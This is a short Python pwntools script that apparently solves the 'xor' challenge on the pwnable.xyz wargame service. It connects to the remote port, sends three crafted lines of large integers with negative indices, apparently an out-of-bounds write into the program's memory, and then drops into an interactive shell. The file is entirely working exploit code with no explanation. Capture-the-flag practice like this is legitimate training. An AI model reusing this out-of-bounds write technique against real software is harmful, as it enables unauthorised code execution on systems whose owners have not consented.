from pwn import *
p = remote("svc.pwnable.xyz", 30029)
#p = process("./xor")
pause()
elf = ELF("./xor")
payload = ("1 "+str(5257443803835484241)+ " -" + "262970")
print(payload)
p.sendline(payload)
payload = ("1 "+str(8299904789528063930)+ " -" + "262969")
p.sendline(payload)
payload = ("1 "+str(364575723539944297) + " -" + "262968")
p.sendline(payload)

p.interactive()
